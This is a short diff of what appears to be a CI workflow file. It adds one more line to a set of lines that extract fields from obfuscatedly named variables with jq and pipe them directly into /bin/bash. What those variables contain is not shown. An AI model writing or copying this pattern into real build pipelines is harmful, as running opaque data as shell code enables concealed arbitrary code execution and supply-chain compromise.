@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$gspb45" | jq -r .zgonb766 | /bin/bash
           echo $mofns5340 | jq -r .uyadk03 | /bin/bash
           printf '%s' "$ug83" | jq -r .lc63927 | /bin/bash
+          printf '%s' "$m1" | jq -r .ldpxj64 | /bin/bash
 
       - name: Upload results
         if: always()
